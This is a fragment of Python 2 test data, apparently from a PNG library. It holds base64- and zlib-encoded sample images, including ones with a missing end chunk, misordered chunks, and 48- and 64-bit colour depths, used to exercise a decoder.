/+xtODt4V+2njS3B\naPGO9QAn27lP7GePjRpf+mR12KW+NulkslfdYokH0MF/mAdPiqRmk8LsQxlTmN4Bb4nuZoKQEAzg\nalvo3UfKXoloPN8mBX0MKE0eF5itoM6gyLrJ/RPQoLkroZnupW0ZnwmIAJT7i+TOy2qS3GgOavJu\nkhotl1fub9aWy7d6jaWbjlIkaDrXSAeKC6Ti/9Kom5vOMJw1VyVTDfk5tEQniai2ebcgVcvWlBzz\nkER6XLTN4AxNDMi33ElBZ6uuloDJv5HeO+/k0gi/62pKk7tXs/FmaavzyHcHJGXpDejjdjNdx7Ki\nAqYcjxbk8lCQehl076JTCOgz4XtoU+j4bGei9oape+g///SkoCmjJ6z30MSXYY7/v8ld6y4ZmQuH\nlsROXidEIOAHszEqrDr0q32b46Owf5e/AJc4RI8=\n'.decode("base64").decode("zlib"),
        'mng_file': 'eJx9lHtMk1cYxo/KJmPBSyoTuUycCgMLZoSJK/fvo0LHpUpbyBCBbYKdbOLih7omtQUklXpLVrCZ\ngIiArgyoBgQm42ObNWwaXMelVGLbUd0ohdqh7aiV+u5z2x9uC/6Sc973yXlO8pzkzZGmpSd5evh4\nIIT80pITM6jq+mf9l0UTMpqQqp6s53zuS6g9frr0NnX++fZULjOBAwXJII2F9ggYCoa5tQBeAB6/\nArp2pwkoHE0wlA0OI9wJBjDCLMBUNkwEg0MFs6UwoQI6H3bkQgkHvmABGQfGCIAQDQS0gleZ9xGI\nPgD5H0FFHii4s4PvDjyMr4O3D8Am1hIZBFVCqgj2E8aqvT1f55/S8XZDCgMSViAF0OqfRlaN7JS2\niMXiphLeD0WbZvIXQSZCPWAAIBQgV83MqORwuBag3zALyQoASlNusVJLhZ6s1f6t//JpQasUi/up\niz0AmQR0JlMakVbUeeONlppt9Z8WVSedPu7fIUbag2j+Y4RGutDNE579H4Rf3Zr51TLBeVR/Bl0/\ngSZLETILkYGDRoP9b6GEb1FhF5K2ovYGNCxHCJjI7oPMyP0XFKpBO26hku/Q2W5EtqKcaYNxOhke\n1+ZoEF1DqABUYGjWIbqu1vi4VgX95Rqkuo/KH1LRDZ6ColSEFpOsxATu4XGLjnWIy/STTHy5lecW\nlX4s/J2A82XHAnzSvFPdvLavWFrotjszwGMN42iCQ7+lbkI1WFwt28eOsV64rYud0yhEln1stqlS\nLWu4hKVgbMm5V2J8BWGjONuwzvWouUrvYd9M36X5vl+b7dNXbfYVdrC9zHvunpSHDEfevJfbzi2e\n/KlOoOQKzFeD9HQy0CUyYG3OjcozQ1lK0lgTFvMcrsXmvFdDl/e9nr1SsN5WyC/g8/gl0nMLQabY\ni7AivLhCv6yPJojsDLPl8oUvtPtivrhVEusu9B5fNe7nfLNzI5O9EIZm52l8J15/tKuiSxLraXEX\nvuaMZub1knA8g8whXPHBBZc5zrrmmbOuP1y9c3Rn91rHXv6T38fK/dXWu1EdRHrcN9YajdNyCOeZ\nL+muP1lOZIguuxqvWad/BvXLcvwgyVHKaNb9QYH6Dx3zlVn2TyT/DvxU1AZvERtsHNOkenNDHp6E\nD2ADHNuC7GqJW8lYw/Bi+DNozlBiCxFGxL7wfQZ8NbYal2NyPAvLwscwUZNpaiF6ubDHJDBtMxXy\nN9iyTFZ1m9qyKkYosTU2V13Jtjfeo60f/PEKwz4YxWmzP+irDLEPP/jNtbR6qkZmqR85OabofjSZ\n3icyR9svBun9SIZrXpjXeOT++59F8P43B9QgTMFL790o1hljAsOf/UQsZnpiO5Zf9qxPo/p1AXOj\nfwKN2oYN\n'.decode("base64").decode("zlib"),
        'modified_phys': 'eJztV2tQE1cYTXXUqgUrVOnQChWJnVoE2zqliiGCWIlBYUAmpEIoEtuqHQISk5AQMpWWh7YyBIko\nSioWrVWJBIEGCKlDOhHRiCIvyUMFSVCSLYFk894uIWMaf7T94Q9fO5O9d3P3nO983z1379ziuK2b\nPOb5zkMgEB6Y6Kh4uLVN/V6fAd+NuJFzcDM3MxqfjUDMkiEQnu2vhapjuuA/F5M3JpETSF+RqWl7\ndyIy03ZlkIMzdpLfWx28Kkyt34VALFyEiYrYRiNo+mN/raEyJePL5EVdAUVx33fd+slISjjMif+i\nPi59n3c1XvzzyUs1F1IuEeOj4soKgn03+jR49BzeFu1TF+HT8KkmYNfoYc7m0AsFxIXV+QHH1mPW\n/xhHp5flLM8GLFRgWGpsbgEK++4fV117qMurMp2ob7GfRoGVoTTQegCsaaJD+tlAIXpIk8qYTdAv\nIYElX6c1S9hBpcTi5dhA/A4Mp0JbFwj3qju8MJwkNvI0I6iDMOC9YCz1zsSCye4j7iN+WZ1203zL\n+8FC5lLzBhIXtcYWiF2ND+jwwvLF5BLkwLJDFNabZjBjzXh3OzvoJrE4EBvU4dWN4hBLPks2ZJX7\ny+Yq19IfVLujDnrul1ah0XKulB30kTwdYyhao0rOR+J3wFLHFm7qJIj6whl9hrVPMCZVqQtZknUf\nmGdiON/wo9hIDrF41A/LP7NXN1f1RIgEc69Jc5Y1LGZh2MhjU/lP0/97JbzciaOeJ6i8ksW4ITdG\nAIcqW0W0JvAKj+6jeKhRGivA+gU5PNup+lVwqTnR/KgyJDsIZooBYRL3Ehe7FXGqtwUGiKdn6RX0\n6UK1Z9BtqjwTBWhUjtuNGxT5AINjuZFqCdUKmiBkE2tQo6hUMBc7p9nB6nKIg9XlkClWl0McglwO\neQV9etB+m5irFfRBxaAiliZiaWeAA0pmhaVwMPw6ymRX3jUAJiRgxnF/eAa1v8RQSsscULZHC6G1\nPuGWfdqZYG5py8Qbhj+WACq7rZ10v0qgWSSzj8jxMG5lYrMTOpp41P0R38yiQbfzBgW55N0OIWxk\n47ZYhVDFHbC3WWyfqAB5LSHLOXLrUYPlCnPQnwmpLw8OVYFzRtEtoqU+vM+nNMNKV/Z4GyInj6RD\nuqEzWPR0ZuJSCq834pFSCPQ3daMaa+hWz0j0HdNlZuaBv8qm00uuNfjGgJLNfDHnYV3YaV1+2L3x\nEBIvNtlJ29lDyP+QDKkpakFrdretJA2r798C4oC9Dbh7Mo7uHvNBQY6CBH+fYPKR49k9nj25erg9\nH4j99mzVRROB0RCMY3jUVlvy1U3Q2yPUa3vgN3WEaOgWwV40cZ/tUvGu1n5X31iWJ7HWOT6C8OqI\nr3HOSV3iuS1gP2dFilPV5G8xL/rjGKXEWgKWsx7kaQ9yVYocyD/T315PzeKahvfJlArBkB+0AWCx\ngBjntuCo4y+4nY+NC5tMuMK5Sbj85+zD7uBdde42DoPRE13rATbbuY+de4+DmlD+eHU4pb4K6RZy\nQNNmTwTQ4X/ahk+JpDar0hZAnVBa3wJviu5kgZAADOHq2hh9Ryteimo82yH5g0woXZEQmqOkzaTK\n+ygyPTRs68UJGX66tslZgAhAeT9P6byoISkttrBW/1apxX555QGhrlKx3W8iw3qMKkEzuBYGUFoo\nFf+XRsO8DKb5rK0mhWYuyKUnuUlEdcy/Canbtqfm2kYk0hOiHWZ3aFJIgf12KjpHfbUMTPmd/M55\nt5TG6nqvprZ6+wktXeXt7iPfHZRUZDSjTzjD9B7P3hoynXgsP4+HgjTLoLsX3UrAmAWfQ1sjJ+e4\nE3U2T59D//mmLxVNHT85dQ5NehHm+P+H3L3ukoW1aGRJvPE6MQYBX5iNW6NqI7/c/zeW8Dk5\n'.decode("base64").decode("zlib"),
        'no_iend': 'eJztV1tQE1cYZnTUqkUrVOnQChWInVoE2zqlimFFsRKDwoBMoEIYJLZVO0QkJiEhZFpaLtrKECSi\nKKlYtNZLJAg0QEgd04mIxgtyE5KoIAlKsiWQbG672yVkTOND7YMP3h52z9k5+33/9//nO+fMKY7b\ntN5zlu8sDw8PT0J0VDzWwhPPG1Owt5k0dBprFtDWJdESqF/RGOm7t3nsSt+eSQvJ3EZ7f3nIsnCt\ncbuHx7z5hKjIzUyyrif2txoGRz4aqCy6EVAU98ONWz+bqQkH+PFf1sVl7PGuTpb9cuxCzdnUC5T4\nqLiyghDfdT71np0HNkf71Eb61H+mC9g+fIC/IexsAWVedX7A4dWE1T/FsVhlOYuzQRsDHFSYm5rB\nwu77RzRXHxryqixH65qRE3ioMowJ2fdCNY0s1DgdLAQGdGns6WTjQipU8nV6k5wXXEopXkwMSt5K\n4Ffoa4OwXnWbF4GfxMOdYAe3kXu9546k3RmbO95x0H3EL6sdscy2fRAi4SyyrqUK8CvgIOLy5IA2\nL6JIRivB9Qbup3PfskKZK0Y7LvGCb1KKg4jBbV4deD6l5PMUU1a5f/9M9UrWg2p31L453yuqAEAp\nUPCCP1ZmEExFKzQp+bjkrZjUkXnr28nS7gh2t2nlE4xJVdpCrnzVh9apBP43oigejk8pHvYjik7u\nNszUPBEiwdpl0Z3iDsq4BB7u8ET+k/T/XQkvd+KoFwmqrOSyryvNkeD+yhYpsxG6LGT5qB7q1OYK\nqG5ujhA+XrcMKzU/WhRVhuMFY0wxEEbiXuJityJO9DZiANnkLL2GPluo/iTQqsmz0MEG9ShiXqvK\nB9l82/U0W5he3IjiGrl9OlWlirPAOc0OVpdDHKwuh0ywuhziEORyyGvos4P2wDKBXtyNFkOqWKaU\nq58C9ao5FbbCvohreAuivmsCLTjQShL8+Bxqf4Wh9OYZUP9OPQrofSJse/RTodzS5rE3TX8uBDUI\nfIl6v0qsm9+PDCmTMdzSxCYndDjxkPtnchOXid7O6xPn0nY4hPBwDZtjVRKNoBdptcGfakDlOXKW\nc+TWo3rbZU6fPwfVXuwbqIJmDAPN0kU+wi8mNGNKl3Z6m9aMH8xADQMnicBkZrJSurAr8pFaAvY0\nduAbalj2OWuAO5aLnF17/y6bTC/lnMk3BpJvEMn4D2vDTxjyw++NhlKFsSlO2vZOcv5HNFRL14pb\nsjvgknSisWcjRAJ315Pu9fMN9zgPCnJUVGx/wsiHjmR3zunMNWLtmSDit6eqzlvI7PoQEtvzXLUt\nX9uIvjPEuLoT+9NAjkZvkZGisfs8l4r39MhdY0NZntxe69gEsdURX+Ock9rE0xuhHv6SVKeq8d9j\nXvbPEXqJvQQq5z7I0+8TaFQ5qP8uf6SOkSWwDO7pV6vEA37oWpDLBWOcx4Kjjr+Stj02LmYyyRLn\nIeHyn7OPuUN4xXnaOAzGSnStB8xspz9xnj0OanL549XhlPo6pFvIXl0rkggCEX/Bg8elCtiuhgMY\nY2r729BN6Z0sCBVDoQJDK7v7UMUrUY3nO6Soj4NmqBLCctTMqQxlN73fiA7CXSQJ28/QOj4NlIJ4\n7xcpnZc1JL0ZDm/xb1HYkItL90oMlaotfmOZ9sMMOcAW2NhgaaFC9jSNplmZHOspuCaVaS3IZSW5\nScS3zb6Jalu3pOXCQ3LFUelWqzs0KbQAuZ0G5GivlEGpf9DePeOW0kht15W0Fm8/ie1G+SX3ke/2\nySsym4CjzjBdR7I3hU4mHivKE+JRXSB697xbCdjTsHtoy5rxGe5E7U2T99B//+nLABijxybuoUkv\nwxz//5A7Vl2wcecPLYw3X6PE/AOR2TDM\n'.decode("base64").decode("zlib"),
        'nonconsecutive_idat': 'eJztV1tQU0cYTmXUqgUrVOnQChWJnVoutnVKFUMEYyUGhQGZkAqhSGyrdghITCAhZCotF21lCBJR\nlFQsXqoSCQINEFKHdCJi4wW5CUlUkAQlORIgJ/fTk5Caxoe2Dz54ezhn98ye7/u//99vd2eLYzdv\ncJ/rMxeBQLhjozBxcGuxPa/PgN96/MhZuJmTEUXIQiA82m3PaxLyaRIC4abCYiK2ZBPVfTGna2hM\nyfhSWdF1/6LY76/f/ElPjj/IifuiPjZtj1c1Qfzz8Ys155MvkuIwsWUFwT7rvRvcuw9uifKui/Bu\n+FTtv2P0IGdj6PkC0oLqfP8ja7Frf4yl08tylmUBJhowLNU3twCFvfeOKq8+0OZVGY7Vt1hPosDK\n0GzQvA+saaJDU7OAQvSQOoUxizi1mAyWfJ3aLGEHlpKKl+ECCNuwnApNXQDcq+7wxHIS2ciTjMAO\nYr/X/LGU2xPzJ7sOuY74ZnZaDfNM7wcLmUuM68hc1CpLAG4lwb/DE8cXU0qQ/UsPUFlvGsH0VeNd\n7ezAG6TiAFxgh2cXikMq+SxJl1nuNzhHsZp+v9oVtd9jr7QKjZZxpezAj2RpWF3RKmVSPpKwDZY6\ntmBDJ1HUG87o1a1+gjGxSlXIkqz5wOiG5XzDx7CRHFLxqC+Of2q3do7yiRDxxh6D+gxrWMzCspFH\nbPlP0/97JTxdiTHPE1RWyWJck+kjgAOVraLsJvAyj+4tf6BW6CvA+vk5PMuJ+hVwqTlRfEwZkh0I\nM0WDMIlriYtdimjrbYIB4ulZegX9G6rHlXbDG8EiyvpESjz5Kwotdfd2REbqjnRKcPp2ynsrg1eE\nqaZ2wFtIkG1XeDoaNafQbco8AxVoVIxb9evk+QCDY7qWYgrVCJogZBNrQC2vlDMXOUxhZ3X6yc7q\n9JON1eknuyCnn15Bnx60zyLmagS9UDEoj8kWsTQzwH4Fs8JUOBD+J8pgVdzRAQYkYMRzf3gGtb/E\nUGrLbHBwlwZCa7zDTXs0bmBuacvEG7rfFwNKq6WdfK9KoF44aB2REWBcUEKzAzqacNj1k9DMyoZu\n5Q0Icik77ULYyMYtMXKhkttvbTNZPlECslpipmPk5sMG02XmgB8TUl0aGKoCZ4+iW0RLvHmf2zTD\nSoO6vXSRk4fSIO3QKRx6OjNxKZXXE/FQIQT6mrpQjTV0s0ck+rbhEjNj36Oy6fSSanU+0aBkI1/M\neVAXdlKbH3Z3PITMi0ly0HZ2E/M/pEAqqkrQmtVlKUnFTfVtAvHA7gb83UGO9i7zfkGOnAzvTzD5\nyNGsbo/u3Cm4PReA+/ZM1QUDkdEQjGe411ab8lVN0NsjtKu74D+1xCjoJtFaNHGP7VTxrsZ6Z6qx\nLE9irrNvgvDqiKtxzEldwtlNYB9nebJD1eSv0S/65xi1xFwClrPu52n2c5XyHMgvw89aT8vkGob3\nDCrkgiFfaB3AYgHRjmPBXsdf8NsfGxc2mXC545Bw+s/Rh93Bu+I4bewGoyc41wNstrMfO84eOzWx\n/PHqcEh9FdIlZL+6zZoAoMP/sAyfEEktZoXFnzahML8F3hDdzgQhARjC1bYxeg9XvBTVeLZD8geY\nUJo8PjRHke1Gk/VSB6egYUsPXsjw1bZNzgREAMrreUrnRQ1JbbGEtfq1Sk3WS0H7hNpK+VbfiXTz\nEZoEzeCaGEBpoVT8Xxp1c9OZxjOWmuRsY0EuPdFFIqpj3g1I1bY1JdcyIpEeE20zukITQwqst1LQ\nOaorZWDyb5R3zrmkNFbXcyWl1ctXaLpe3u468t1+SUV6M/qYI0zP0azNIdOJx/DzeChIvRS6c8Gl\nBIyZ8K21NXJytitRZ/P0rfWff/rQ0LTx47Zba+KLMMf/P+TONRdNrIUji+OoGwIewVcrBHb9Zkxt\n5Jd7/wI6hT1W\n'.decode("base64").decode("zlib"),
        'plte_after_idat': 'eJztVn1MU1cUvwtZpiSoGWFsdhUznQtTxChrJxAKRoQOULFq5hdFoxYmtn4UaERtFQ1+AI1WbRRK\nZ4LTWqTxsyjYoq3dHJl1wLo29VHbikxaPh6stpS2Zy0wA/NvcSbevHN+77z3O+ee+3vv3byjy5em\nhARPDUYIhVBTF6/wozdgE4L8PtF24JEfPmEnf8+msbayCzfu2oJ2bMxlsucyt7Cnx8ydF/eXIxeh\n4Cjq4qSVnKwuLEWwOSWM9/u9ogWNTw+HTzvkbJvI750efzKRM/l+vQQyCv/8LHeWa778ypE7jBM7\n+7sUl/ZGC/PbMwl8jGPSDJK7n7j+1jBICTdxXCShf3zu0Kzz1JxhYNTb3fTPJ5XQzy6T+NJg4Nka\nD1d7xkbuOxzgNBvm3va5haz0jkMjoTzL6dBuiF8octsYPYPmXn7oFbGAq9vr6fQ2zxiqyr6VVqus\nw5lq8QpvyOSqQUGNsr+nRDVg5C4ZmlPUtXE5TBmh/rebCveXr4I3RKjvO1KWwopnWmcQIvQuj4ZB\nTriKX31Nl3HoZBwIcbhblMKM329VESIwl0UTTmq7hj8nijJyRvFEGYzQMVkthlGR/6mzSWNmIb1P\nH6/02obN1lUEvoFzX/MROeEGXlVWyGzYx+gUjqX9tJ86puz2d5KwtMHXTojGOO0aG6nbwGnRGElt\nN/Hy1z7NOJ3JJ1eZQ8JbooYv7+n2qcy9hP4Ph0X2iesnlVCeuLpY0GTjq/4lPfdxsSLtPu7dhfSh\nSlfldbbCM01SZY+WEreO69EW8Y27Fwkez4whFrEc8y5RCkzOixFE+fDeF/uyrfO8W5zlycQIyy76\n7obfK+nRPhTL2tZ4LmAcCpk+JdDcC32RtL+3gtUwK2ZixlCtADwlOdJeBX54kUdTzhxNeDQOhIL2\nMEK0kYNr+klVSvx0GSuvId+Kxb2FTsZjsRaHzMBxaASkqjrcXtbB3JtvjSOYjGf/B3vyGyCEyrg6\nzQJS1TX8WVl4XjzDuo1geuLqftQaPUqUx9XXM7wnH48SKtb4ThJEHO8CcpUCby27uH09xjFrjpMU\nip3O11a7YZeXWKIylzwXSJVWp3zD3ZeNxQMjL4xwLbeLb0pYRx80GsuNoVJKAX3QIS83CiTKl40P\nxK0ioodWQ4ntEvRInUH1NKn/j2ZaKeW2u0LrjdTRvQ/Npg4WLByRv0mmPPoW5djlxQph8vFN3ryc\nxCg7QkFoefrK5E/3w5wciN8NSTTIzIJ0LmxJhXwaZOfCDrZl/s1vQ5SbiE0I/RGJOtGEpwg5pkbp\nEDLRECSjzn1zdOzV0klbb6E9P6Il4p3bTqckNaLMJrReh/LvoS8uVwQJIFTsQzceIAkgRQ+qA/Kp\n1q+OAvq1FLXemoNVrjt2OVUCbP9RB+ttpur8VTCbCt/s1hegX7bNhqQpsBpBWqw9+wNPHsJWbYbV\n7GMJUBsDCgqc+qHudnb5YTqcpYJkJQ5hBwHdgek1zZFgiAQIbndGAIQBfK0zR4IlBvoSRcCp/O27\nn5vXwou1wD9OFJ9Bx2rQOTm6zkO155GiBhXr0AUMqUpRixB1HEBwI1X9DFlsqTweT+g3nkwWOFML\n1fbiPlACqIU8vYxnqAb8ALiqQQ1Ku1poGaiEjkrwe1CqwaQHvRpAD3YT7vdgAjCrwaUGu91v/jsm\nlwXAAjgEBno/xnEYikvxAFKTly6uXZR98B+7Qrlm\n'.decode("base64").decode("zlib"),
        'png48': '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\nbuYM+AVk3x5sRNXuP138F5+clgc=\n'.decode("base64").decode("zlib"),
        'png64': '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\nigg=\n'.decode("base64").decode("zlib"),
